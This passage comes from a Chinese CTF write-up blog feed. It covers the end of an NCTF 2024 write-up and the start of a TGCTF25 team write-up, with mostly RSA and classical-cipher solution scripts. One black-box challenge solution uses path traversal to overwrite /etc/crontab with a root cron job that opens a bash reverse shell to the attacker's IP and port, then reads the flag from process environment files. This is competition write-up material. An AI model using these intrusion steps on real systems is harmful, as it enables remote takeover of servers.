<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------att-------------'</span><span class="token punctuation">)</span>
attack_monster<span class="token punctuation">(</span>p<span class="token punctuation">,</span> RNG1<span class="token punctuation">,</span>Dall<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#--------------------------------------------------------------</span></code></pre>

<p>黑盒部分：</p>
<p>只有输入文件名以及输入文件内容这些功能</p>
<p>发现可以文件名任意写，覆盖crontab定时任务，执行shellcode来远程操控</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span><span class="token punctuation">..</span>//<span class="token punctuation">..</span><span class="token punctuation">..</span>//<span class="token punctuation">..</span><span class="token punctuation">..</span>//<span class="token punctuation">..</span><span class="token punctuation">..</span>//etc/crontab

<span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/sh

<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /bin/bash <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1'</span></code></pre>

<p>获得shell后寻找flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#linux命令：</span>
<span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-exec</span> <span class="token function">grep</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-i</span> <span class="token string">"nctf"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> + <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null

<span class="token comment">#Out:</span>
/proc/1/task/1/environ

<span class="token comment">#linux命令：</span>
<span class="token function">cat</span> /proc/1/task/1/environ

<span class="token comment">#Out：</span>
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME<span class="token operator">=</span>comp-xlcrypsc-67706716887745083pclt4FLAG<span class="token operator">=</span>nctf<span class="token punctuation">&#123;</span>760bd839-02ff-4b4f-b5a9-3b006910963a<span class="token punctuation">&#125;</span>KUBERNETES_PORT<span class="token operator">=</span>tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP<span class="token operator">=</span>tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP_PROTO<span class="token operator">=</span>tcpKUBERNETES_PORT_443_TCP_PORT<span class="token operator">=</span>443KUBERNETES_PORT_443_TCP_ADDR<span class="token operator">=</span><span class="token number">192.168</span>.0.1KUBERNETES_SERVICE_HOST<span class="token operator">=</span><span class="token number">192.168</span>.0.1KUBERNETES_SERVICE_PORT<span class="token operator">=</span>443KUBERNETES_SERVICE_PORT_HTTPS<span class="token operator">=</span>443HOME<span class="token operator">=</span>/root
</code></pre>

<h3 id="QRcode-Reconstruction"><a href="#QRcode-Reconstruction" class="headerlink" title="QRcode Reconstruction"></a>QRcode Reconstruction</h3><p><img src="/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png" loading="lazy">手搓。</p>
<p>最后decode是</p>
<p><img src="/images/1742737035701-dfd8da36-52fa-4ed1-b08c-ee997cda532a.png" loading="lazy"></p>
<p>猜到flag是nctf{WeLc0mE_t0_Nctf_2024!!!}</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><p>爆零O.o</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>cry</tag>
        <tag>web</tag>
        <tag>re</tag>
        <tag>pwn</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>TGCTF25 不知道 WP</title>
    <url>/2025/04/14/TGCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/</url>
    <content><![CDATA[<h1 id="战队名：不知道"><a href="#战队名：不知道" class="headerlink" title="战队名：不知道"></a>战队名：不知道</h1><p><strong>排名：3</strong></p>
<p><img src="/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png" loading="lazy"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="AAAAAAAA·真·签到"><a href="#AAAAAAAA·真·签到" class="headerlink" title="AAAAAAAA·真·签到"></a>AAAAAAAA·真·签到</h3><p>UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}</p>
<p>和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++</p>
<pre class="language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'UGBRC&#123;RI0G!O04_5C3_OVUI_DV_MNTB&#125;'</span>

s<span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>

        ind<span class="token operator">=</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        ind<span class="token operator">+=</span>i<span class="token operator">-</span><span class="token number">1</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>ind<span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<blockquote>
<p>TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}</p>
</blockquote>
<h3 id="mm不躲猫猫"><a href="#mm不躲猫猫" class="headerlink" title="mm不躲猫猫"></a>mm不躲猫猫</h3><p>给了60组n，c，n有公共因子gcd求得解密即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

e <span class="token operator">=</span> <span class="token number">65537</span>

n_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
c_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

current_n <span class="token operator">=</span> <span class="token boolean">None</span>
current_c <span class="token operator">=</span> <span class="token boolean">None</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'E:\\wenjian\\p\\timu\\tgCTF\\cry\\challenge.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>
        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span> <span class="token keyword">and</span> line<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> current_n <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> current_c <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                n_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_n<span class="token punctuation">)</span>
                c_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_c<span class="token punctuation">)</span>
                current_n <span class="token operator">=</span> <span class="token boolean">None</span>
                current_c <span class="token operator">=</span> <span class="token boolean">None</span>
        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'n = '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            current_n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'c = '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            current_c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> current_n <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> current_c <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        n_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_n<span class="token punctuation">)</span>
        c_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_c<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    n<span class="token operator">=</span>n_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    other<span class="token operator">=</span>n_list<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> n_list<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    p<span class="token operator">=</span><span class="token boolean">None</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> other<span class="token punctuation">:</span>
        <span class="token keyword">if</span> GCD<span class="token punctuation">(</span>n<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>
            p<span class="token operator">=</span>GCD<span class="token punctuation">(</span>n<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
            q<span class="token operator">=</span>n<span class="token operator">//</span>p
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> p <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

    d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<blockquote>
<p>TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}</p>
</blockquote>
<h3 id="RwSiAns"><a href="#RwSiAns" class="headerlink" title="RwSiAns"></a>RwSiAns</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> FLAG
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long
<span class="token keyword">import</span> hashlib

<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span>bits<span class="token operator">=</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
    <span class="token keyword">return</span> p <span class="token operator">*</span> q<span class="token punctuation">,</span> <span class="token number">3</span>

<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">7</span>
    c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> c1<span class="token punctuation">,</span> c2

m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>
n<span class="token punctuation">,</span> e <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
c1<span class="token punctuation">,</span> c2 <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

n <span class="token operator">=</span> <span class="token number">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>
e <span class="token operator">=</span> <span class="token number">3</span>
c1 <span class="token operator">=</span> <span class="token number">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>
c2 <span class="token operator">=</span> <span class="token number">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span></code></pre>

<p>基础的相关信息攻击</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> hashlib

<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span>bits<span class="token operator">=</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
    <span class="token keyword">return</span> p <span class="token operator">*</span> q<span class="token punctuation">,</span> <span class="token number">3</span>

<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">7</span>
    c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> c1<span class="token punctuation">,</span> c2


n <span class="token operator">=</span> <span class="token number">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>
e <span class="token operator">=</span> <span class="token number">3</span>
c1 <span class="token operator">=</span> <span class="token number">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>
c2 <span class="token operator">=</span> <span class="token number">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span>
s1<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">(</span><span class="token number">307</span><span class="token punctuation">)</span>
s2<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">franklinReiter</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
    g1 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c1
    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>s2<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2

    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> g2<span class="token punctuation">:</span>
            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2
        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

m<span class="token operator">=</span>franklinReiter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<blockquote>
<p>TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}</p>
</blockquote>
<h3 id="宝宝rsa"><a href="#宝宝rsa" class="headerlink" title="宝宝rsa"></a>宝宝rsa</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> math <span class="token keyword">import</span> gcd
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

<span class="token comment"># PART1</span>
p1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
q1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
n1 <span class="token operator">=</span> p1 <span class="token operator">*</span> q1
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
m1 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
e1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
    e1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>
c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p1 ="</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q1 ="</span><span class="token punctuation">,</span> q1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 ="</span><span class="token punctuation">,</span> c1<span class="token punctuation">)</span>

<span class="token comment"># PART2</span>
n2 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token operator">*</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
e2 <span class="token operator">=</span> <span class="token number">3</span>
m2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n2 ="</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 ="</span><span class="token punctuation">,</span> c2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e2 ="</span><span class="token punctuation">,</span> e2<span class="token punctuation">)</span></code></pre>

<p>flag分两段，前一段未知e，但是比较小，直接爆破就行，第二段e&#x3D;3，n为1024位，m应该比较小直接开方即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm

phi1<span class="token operator">=</span><span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>i<span class="token punctuation">,</span> phi1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>i<span class="token punctuation">,</span>phi1<span class="token punctuation">)</span>
    m1<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p1<span class="token operator">*</span>q1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'TGCTF'</span> <span class="token keyword">in</span> m1<span class="token punctuation">:</span>
        <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span>

<span class="token comment"># ---------------------------------------------------</span>
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>

m2<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c2<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span></code></pre>

<blockquote>
<p>TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}</p>
</blockquote>
<h3 id="费克特尔"><a href="#费克特尔" class="headerlink" title="费克特尔"></a>费克特尔</h3><pre class="language-Plain" data-language="Plain"><code class="language-Plain">c&#x3D;670610235999012099846283721569059674725712804950807955010725968103642359765806
n&#x3D;810544624661213367964996895060815354972889892659483948276203088055391907479553
e&#x3D;65537</code></pre>

<p>n很小直接yafu分一下,有很多因子,正常解即可</p>
<pre class="language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *

c&#x3D;670610235999012099846283721569059674725712804950807955010725968103642359765806
n&#x3D;810544624661213367964996895060815354972889892659483948276203088055391907479553
e&#x3D;65537

p&#x3D; [916848439436544911290378588839845528581,214168842768662180574654641, 2001511,18251 ,113 ]
phi&#x3D;1
for i in p:
    phi*&#x3D;(i-1)

d&#x3D;inverse(e,phi)

print(long_to_bytes(pow(c,d,n)))</code></pre>

<blockquote>
<p>TGCTF{f4888_6abdc_9c2bd_9036bb}</p>
</blockquote>
<h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><pre class="language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *

def genarate_emojiiiiii_prime(nbits, base&#x3D;0):
    while True:
        p &#x3D; getPrime(base &#x2F;&#x2F; 32 * 32) if base &gt;&#x3D; 3 else 0
        for i in range(nbits &#x2F;&#x2F; 8 &#x2F;&#x2F; 4 - base &#x2F;&#x2F; 32):
